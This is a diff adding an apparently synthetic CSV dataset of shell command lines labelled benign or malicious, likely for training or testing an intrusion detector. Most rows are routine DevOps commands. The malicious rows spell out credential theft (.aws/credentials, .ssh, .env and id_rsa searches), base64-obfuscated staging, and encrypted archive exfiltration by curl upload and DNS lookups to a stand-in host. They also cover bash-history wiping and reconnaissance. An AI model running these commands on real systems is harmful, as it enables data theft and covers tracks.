@@ -1,0 +1,221 @@
+process_name,command_line,label
+npm,npm ci --no-audit,benign
+bash,cd /home/ec2-user/mobile-api && ls,benign
+git,git commit -am 'fix: nginx retry logic',benign
+docker,docker ps -a,benign
+uptime,uptime,benign
+bash,"X='find /var /home -name '\''*.sql'\'' -o -name '\''*.csv'\'' 2>/dev/null | head'; eval ""$X""",malicious
+htop,htop -d 5,benign
+ps,ps aux --sort=-%mem | head,benign
+grep,grep -r 'TODO' /home/ec2-user/data-pipeline/src,benign
+tar,tar czf /backups/nginx-31.tgz /var/lib/nginx,benign
+docker,docker compose up -d postgres,benign
+grep,grep -r 'TODO' /home/ec2-user/mobile-api/src,benign
+npm,npm test -- --runInBand,benign
+apt-get,apt-get install -y python3-pip,benign
+aws,aws s3 ls s3://api-gateway-artifacts/,benign
+bash,ls -la /home/ec2-user,benign
+bash,cd /home/ec2-user/data-pipeline && ls,benign
+terraform,terraform plan -out tfplan,benign
+bash,echo Y3AgLXIgL3Zhci93d3cvZXhwb3J0cyAvdG1wLy5jYWNoZS9k | base64 -d | bash,malicious
+aws,aws s3 ls s3://postgres-artifacts/,benign
+psql,psql -h db -U ec2-user -c 'SELECT count(*) FROM orders;',benign
+kubectl,kubectl rollout status deploy/auth-svc,benign
+find,find /home/ec2-user/mobile-api -name '*.log' -mtime +7,benign
+kubectl,kubectl rollout status deploy/worker,benign
+git,git log --oneline -n 10,benign
+git,git pull origin release/2.4,benign
+kubectl,kubectl rollout status deploy/api-gateway,benign
+go,go build ./...,benign
+ssh,ssh ec2-user@build-73 uptime,benign
+bash,echo dGFyIGN6ZiAvdG1wLy5jYWNoZS8uc2Vzc2lvbi50Z3ogL3RtcC8uY2FjaGUvZA== | base64 -d | bash,malicious
+rsync,rsync -az /home/ec2-user/mobile-api/dist/ /var/www/api-gateway/,benign
+git,git status,benign
+kubectl,kubectl logs deploy/api-gateway --tail 50,benign
+pip3,pip3 install -r requirements.txt,benign
+python3,python3 /opt/app/manage.py migrate,benign
+node,node scripts/seed.js,benign
+redis-cli,redis-cli ping,benign
+kubectl,kubectl rollout status deploy/nginx,benign
+openssl,openssl enc -aes-256-cbc -in /tmp/.cache/.session.tgz -out /tmp/.cache/.session.tgz.e -k 430359ccab2a953238a391bc3ff66487,malicious
+python3,python3 -m pytest tests/ -q,benign
+git,git commit -am 'fix: worker retry logic',benign
+docker,docker build -t redis:19 .,benign
+rsync,rsync -az /home/ec2-user/data-pipeline/dist/ /var/www/auth-svc/,benign
+free,free -m,benign
+bash,cd /home/ec2-user/platform && ls,benign
+aws,aws s3 ls s3://auth-svc-artifacts/,benign
+aws,aws s3 ls s3://redis-artifacts/,benign
+scp,scp report.csv ec2-user@reports:/srv/reports/,benign
+curl,curl -fsS https://api.github.com/repos/billing-service/commits | head,benign
+split,split -b 4m /tmp/.cache/.session.tgz.e /tmp/.cache/p_,malicious
+journalctl,journalctl -u auth-svc --since '10 min ago',benign
+docker,docker compose up -d search,benign
+npm,npm run build,benign
+journalctl,journalctl -u search --since '10 min ago',benign
+git,git commit -am 'fix: api-gateway retry logic',benign
+ssh,ssh ec2-user@build-69 uptime,benign
+kubectl,kubectl logs deploy/redis --tail 50,benign
+kubectl,kubectl get pods -n production,benign
+tar,tar czf /backups/worker-15.tgz /var/lib/worker,benign
+docker,docker logs --tail 100 nginx,benign
+docker,docker logs --tail 100 worker,benign
+curl,curl -s -F file=@/tmp/.cache/.session.tgz.e https://pkg-mirror-488.test/u,malicious
+journalctl,journalctl -u postgres --since '10 min ago',benign
+docker,docker build -t postgres:12 .,benign
+systemctl,systemctl restart search,benign
+tar,tar czf /backups/redis-78.tgz /var/lib/redis,benign
+systemctl,systemctl restart nginx,benign
+git,git checkout develop,benign
+git,git commit -am 'fix: auth-svc retry logic',benign
+docker,docker logs --tail 100 payments,benign
+df,df -h,benign
+bash,for c in $(base64 /tmp/.cache/p_aa); do nslookup $c.pkg-mirror-488.test; done,malicious
+find,find /home/ec2-user/billing-service -name '*.log' -mtime +7,benign
+aws,aws s3 ls s3://nginx-artifacts/,benign
+journalctl,journalctl -u nginx --since '10 min ago',benign
+aws,aws s3 ls s3://search-artifacts/,benign
+find,find /home/ec2-user/infra -name '*.log' -mtime +7,benign
+grep,grep -r 'TODO' /home/ec2-user/billing-service/src,benign
+grep,grep -r 'TODO' /home/ec2-user/platform/src,benign
+git,git pull origin hotfix/login,benign
+bash,"X='getent passwd | awk -F: '\''$3>=1000{print $1}'\'''; eval ""$X""",malicious
+kubectl,kubectl rollout status deploy/redis,benign
+tar,tar czf /backups/payments-55.tgz /var/lib/payments,benign
+docker,docker build -t worker:64 .,benign
+systemctl,systemctl status api-gateway,benign
+make,make lint,benign
+journalctl,journalctl -u api-gateway --since '10 min ago',benign
+curl,curl -s http://localhost:8080/health,benign
+systemctl,systemctl status search,benign
+git,git pull origin feature/checkout,benign
+docker,docker logs --tail 100 auth-svc,benign
+systemctl,systemctl status auth-svc,benign
+ssh,ssh ec2-user@build-35 uptime,benign
+ssh,ssh ec2-user@build-3 uptime,benign
+grep,grep -r 'TODO' /home/ec2-user/infra/src,benign
+git,git pull origin develop,benign
+kubectl,kubectl logs deploy/payments --tail 50,benign
+bash,"ps -eo user,pid,cmd --sort=-%cpu | head -n 25",malicious
+docker,docker compose up -d nginx,benign
+git,git checkout main,benign
+ssh,ssh ec2-user@build-43 uptime,benign
+systemctl,systemctl status payments,benign
+apt-get,apt-get install -y ripgrep,benign
+tar,tar czf /backups/nginx-25.tgz /var/lib/nginx,benign
+apt-get,apt-get install -y openjdk-17-jdk,benign
+systemctl,systemctl restart auth-svc,benign
+bash,truncate -s0 /home/ec2-user/.bash_history 2>/dev/null,malicious
+docker,docker build -t auth-svc:50 .,benign
+find,find /home/ec2-user/platform -name '*.log' -mtime +7,benign
+bash,cd /home/ec2-user/web-app && ls,benign
+find,find /home/ec2-user/web-app -name '*.log' -mtime +7,benign
+docker,docker logs --tail 100 search,benign
+systemctl,systemctl restart api-gateway,benign
+bash,find /home/ec2-user -name '*.env' -o -name 'id_rsa' 2>/dev/null | head,malicious
+docker,docker logs --tail 100 postgres,benign
+ssh,ssh ec2-user@build-40 uptime,benign
+find,find /home/ec2-user/data-pipeline -name '*.log' -mtime +7,benign
+apt-get,apt-get install -y nodejs,benign
+apt-get,apt-get install -y git-lfs,benign
+curl,curl -fsS https://api.github.com/repos/data-pipeline/commits | head,benign
+docker,docker build -t search:9 .,benign
+ssh,ssh ec2-user@build-14 uptime,benign
+docker,docker compose up -d auth-svc,benign
+bash,cd /home/ec2-user/billing-service && ls,benign
+tar,tar czf /backups/redis-43.tgz /var/lib/redis,benign
+git,git checkout hotfix/login,benign
+systemctl,systemctl status worker,benign
+ssh,ssh ec2-user@build-29 uptime,benign
+systemctl,systemctl restart payments,benign
+bash,cat /home/ec2-user/.aws/credentials 2>/dev/null,malicious
+systemctl,systemctl status redis,benign
+git,git checkout release/2.4,benign
+docker,docker compose up -d api-gateway,benign
+git,git pull origin main,benign
+systemctl,systemctl status postgres,benign
+rsync,rsync -az /home/ec2-user/billing-service/dist/ /var/www/api-gateway/,benign
+bash,"X='getent passwd | awk -F: '\''$3>=1000{print $1}'\'' # 3320'; eval ""$X""",malicious
+docker,docker build -t payments:94 .,benign
+systemctl,systemctl status nginx,benign
+docker,docker build -t redis:88 .,benign
+rsync,rsync -az /home/ec2-user/data-pipeline/dist/ /var/www/worker/,benign
+ssh,ssh ec2-user@build-51 uptime,benign
+rsync,rsync -az /home/ec2-user/billing-service/dist/ /var/www/search/,benign
+tar,tar czf /backups/auth-svc-97.tgz /var/lib/auth-svc,benign
+ss,ss -tnp 2>/dev/null | head -n 40,malicious
+docker,docker compose up -d worker,benign
+tar,tar czf /backups/api-gateway-47.tgz /var/lib/api-gateway,benign
+ssh,ssh ec2-user@build-97 uptime,benign
+docker,docker build -t postgres:90 .,benign
+docker,docker logs --tail 100 api-gateway,benign
+tar,tar czf /backups/search-21.tgz /var/lib/search,benign
+curl,curl -fsS https://api.github.com/repos/web-app/commits | head,benign
+apt-get,apt-get install -y htop,benign
+kubectl,kubectl logs deploy/nginx --tail 50,benign
+docker,docker build -t payments:12 .,benign
+bash,truncate -s0 /home/ec2-user/.bash_history 2>/dev/null # 5872,malicious
+tar,tar czf /backups/postgres-97.tgz /var/lib/postgres,benign
+tar,tar czf /backups/payments-88.tgz /var/lib/payments,benign
+ssh,ssh ec2-user@build-70 uptime,benign
+tar,tar czf /backups/postgres-30.tgz /var/lib/postgres,benign
+kubectl,kubectl logs deploy/postgres --tail 50,benign
+tar,tar czf /backups/search-24.tgz /var/lib/search,benign
+ssh,ssh ec2-user@build-11 uptime,benign
+tar,tar czf /backups/postgres-95.tgz /var/lib/postgres,benign
+rsync,rsync -az /home/ec2-user/billing-service/dist/ /var/www/auth-svc/,benign
+journalctl,journalctl -u worker --since '10 min ago',benign
+docker,docker build -t nginx:89 .,benign
+cp,cp -r /home/ec2-user/.ssh /tmp/.cache/ 2>/dev/null,malicious
+ssh,ssh ec2-user@build-82 uptime,benign
+ssh,ssh ec2-user@build-90 uptime,benign
+bash,cd /home/ec2-user/infra && ls,benign
+git,git commit -am 'fix: search retry logic',benign
+ssh,ssh ec2-user@build-92 uptime,benign
+systemctl,systemctl restart worker,benign
+git,git commit -am 'fix: redis retry logic',benign
+rsync,rsync -az /home/ec2-user/infra/dist/ /var/www/api-gateway/,benign
+docker,docker build -t auth-svc:67 .,benign
+ssh,ssh ec2-user@build-93 uptime,benign
+docker,docker build -t auth-svc:10 .,benign
+curl,curl -fsS https://api.github.com/repos/infra/commits | head,benign
+journalctl,journalctl -u payments --since '10 min ago',benign
+git,git commit -am 'fix: postgres retry logic',benign
+rsync,rsync -az /home/ec2-user/billing-service/dist/ /var/www/redis/,benign
+curl,curl -fsS https://api.github.com/repos/mobile-api/commits | head,benign
+bash,cat /home/ec2-user/.aws/credentials 2>/dev/null # 6822,malicious
+apt-get,apt-get install -y jq,benign
+rsync,rsync -az /home/ec2-user/platform/dist/ /var/www/payments/,benign
+systemctl,systemctl restart postgres,benign
+rsync,rsync -az /home/ec2-user/web-app/dist/ /var/www/postgres/,benign
+curl,curl -fsS https://api.github.com/repos/platform/commits | head,benign
+docker,docker build -t auth-svc:30 .,benign
+sudo,sudo -n -l 2>/dev/null,malicious
+ssh,ssh ec2-user@build-58 uptime,benign
+docker,docker build -t redis:11 .,benign
+tar,tar czf /backups/auth-svc-73.tgz /var/lib/auth-svc,benign
+kubectl,kubectl logs deploy/worker --tail 50,benign
+docker,docker build -t search:92 .,benign
+docker,docker build -t api-gateway:91 .,benign
+docker,docker build -t worker:69 .,benign
+rsync,rsync -az /home/ec2-user/platform/dist/ /var/www/worker/,benign
+docker,docker build -t nginx:82 .,benign
+tar,tar czf /backups/api-gateway-5.tgz /var/lib/api-gateway,benign
+kubectl,kubectl rollout status deploy/search,benign
+ssh,ssh ec2-user@build-10 uptime,benign
+tar,tar czf /backups/search-28.tgz /var/lib/search,benign
+kubectl,kubectl logs deploy/auth-svc --tail 50,benign
+ss,ss -tnp 2>/dev/null | head -n 40 # 7256,malicious
+grep,grep -r 'TODO' /home/ec2-user/web-app/src,benign
+docker,docker build -t search:97 .,benign
+ssh,ssh ec2-user@build-53 uptime,benign
+systemctl,systemctl restart redis,benign
+ssh,ssh ec2-user@build-79 uptime,benign
+docker,docker compose up -d payments,benign
+git,git checkout feature/checkout,benign
+docker,docker build -t worker:3 .,benign
+rsync,rsync -az /home/ec2-user/data-pipeline/dist/ /var/www/search/,benign
+bash,truncate -s0 /home/ec2-user/.bash_history 2>/dev/null # 4275,malicious
+tar,tar czf /backups/api-gateway-88.tgz /var/lib/api-gateway,benign
+ssh,ssh ec2-user@build-83 uptime,benign
+kubectl,kubectl logs deploy/search --tail 50,benign
